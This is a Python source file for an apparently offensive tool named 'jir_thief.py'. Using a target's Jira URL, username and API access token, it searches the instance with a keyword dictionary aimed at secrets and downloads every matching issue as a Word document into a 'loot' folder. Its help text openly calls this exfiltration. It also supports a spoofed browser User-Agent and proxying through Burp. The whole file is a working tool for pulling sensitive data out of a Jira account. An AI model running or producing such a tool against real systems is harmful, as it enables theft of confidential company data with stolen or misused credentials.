import requests, json, sys, getopt, time

# Set that holds all of the issues found in the keyword search
issueSet = set()

# Set these ENV Variables to proxy through burp:
# export REQUESTS_CA_BUNDLE='/path/to/pem/encoded/cert'
# export HTTP_PROXY="http://127.0.0.1:8080"
# export HTTPS_PROXY="http://127.0.0.1:8080"


default_headers = {
    'Accept': 'application/json',
}

form_token_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Atlassian-Token": "no-check",
}

def getNumberOfPages(query, username, access_token, cURL):
    totalSize = 0
    q = '/rest/api/2/search'
    URL = cURL + q
    response = requests.request("GET",
        URL,
        auth=(username, access_token),
        headers=default_headers,
        params=query
    )

    jsonResp = response.json()
    totalSize = int(jsonResp["total"])
    return totalSize

def downloadContent(username, access_token, cURL):
    # https://yourorg.atlassian.net/si/jira.issueviews:issue-word/KEY-123/KEY-123.doc
    headers = form_token_headers
    print('[*] Downloading files')
    count = 1
    set_length = len(issueSet)
    for issueKey in issueSet:
        url = cURL + "/si/jira.issueviews:issue-word/{KEY}/{KEY}.doc".format(KEY=issueKey)
        try:
            response = requests.request("GET",
                url,
                auth=(username, access_token),
                headers=headers
            )

            path = "loot/{KEY}.doc".format(KEY=issueKey)
            with open(path, 'wb') as f:
                f.write(response.content)
            print('[*] Downloaded {count} of {set_length} files: {KEY}.doc'.format(count=count, set_length=set_length, KEY=issueKey))
            count += 1
        except Exception as err:
            print("Error : " + str(err))



def searchKeyWords(path, username, access_token, cURL):
    search_term = " "
    try:
        f = open(path, "r")
    except Exception as e:
        print('[*] An Error occured opening the dictionary file: %s' % str(e))
        sys.exit(2)

    print("[*] Searching for Jira content for keywords and compiling a list of issues")
    for line in f:
        tempSetCount = len(issueSet)
        count = 0
        search_term = line.strip()
        searchQuery = {
            'jql': 'text~\"' + search_term + '\"'
        }

        totalSize = getNumberOfPages(searchQuery, username, access_token, cURL)
        if totalSize:
            print("[*] Setting {total} results for search term: {term}".format(total=totalSize, term=search_term))
            start_point = 1
            while start_point < totalSize:
                print("[*] Setting {startpoint} of {total} results for search term: {term}".format(startpoint=start_point, total=totalSize, term=search_term))
                q = "/rest/api/2/search?startAt={start_point}&maxResults=100".format(start_point=start_point)
                URL = cURL + q
                response = requests.request("GET",
                    URL,
                    auth=(username, access_token),
                    headers=default_headers,
                    params=searchQuery
                )

                jsonResp = json.loads(response.text)
                if jsonResp['total']:
                    issues = jsonResp['issues']
                    for issue in issues:
                        issueKey = issue['key']
                        issueSet.add(issueKey)


                start_point += 100

            if len(issueSet) > tempSetCount:
                count = len(issueSet) - tempSetCount
                tempSetCount = len(issueSet)
            print("[*] %i unique issues added to the set for search term: %s." % (count, search_term))
        else:
            print("[*] No issues found for search term: %s" % search_term)

    print("[*] Compiled set of %i unique issues to download from your search" % len(issueSet))


def main():
    cURL=""
    dict_path = ""
    username = ""
    access_token = ""
    user_agent = ""

    # usage
    usage = '\nusage: python3 jir_thief.py [-h] -j <TARGET URL> -u <Target Username> -p <API ACCESS TOKEN> -d <DICTIONARY FILE PATH> [-a] "<UA STRING>"'

    #help
    help = '\nThis Module will connect to Jira\'s API using an access token, '
    help += 'export to a word .doc, and download the Jira issues\nthat the target has access to. '
    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nJira for'
    help += ' potentially sensitive data. It will output exfiltrated DOCs to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-j <TARGET JIRA URL>, --url <TARGET JIRA URL>'
    help += '\n\t\tThe URL of target Jira account'
    help += '\n\t-u <TARGET JIRA ACCOUNT USERNAME>, --user <TARGET USERNAME>'
    help += '\n\t\tThe username of target Jira account'
    help += '\n\t-p <TARGET JIRA ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET JIRA ACCOUNT API ACCESS TOKEN>'
    help += '\n\t\tThe API Access Token of target Jira account'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\tPath to the dictionary file.'
    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\noptional arguments:'
    help += '\n\t-a "<DESIRED UA STRING>", --user-agent "<DESIRED UA STRING>"'
    help += '\n\t\tThe User-Agent string you wish to send in the http request.'
    help += '\n\t\tYou can use the latest chrome for MacOS for example: -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"'
    help += '\n\t\tDefault is "python-requests/2.25.1"'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'

    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hj:u:p:d:a:", ["help", "url=", "user=", "accesstoken=", "dict=", "user-agent="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-j", "--url"):
            cURL = arg
        if opt in ("-u", "--user"):
            username = arg
        if opt in ("-p", "--accesstoken"):
            access_token = arg
        if opt in ("-d", "--dict"):
            dict_path = arg
        if opt in ("-a", "--user-agent"):
            user_agent = arg

    # check for mandatory arguments
    if not username:
        print("\nUsername  (-u, --user) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not access_token:
        print("\nAccess Token  (-p, --accesstoken) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not dict_path:
        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not cURL:
        print("\nJira URL  (-j, --url) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    # Strip trailing / from URL if it has one
    if cURL.endswith('/'):
        cURL = cURL[:-1]

    # Check for user-agent argument
    if user_agent:
        default_headers['User-Agent'] = user_agent
        form_token_headers['User-Agent'] = user_agent

    searchKeyWords(dict_path, username, access_token, cURL)
    downloadContent(username, access_token, cURL)


if __name__ == "__main__":
    main()
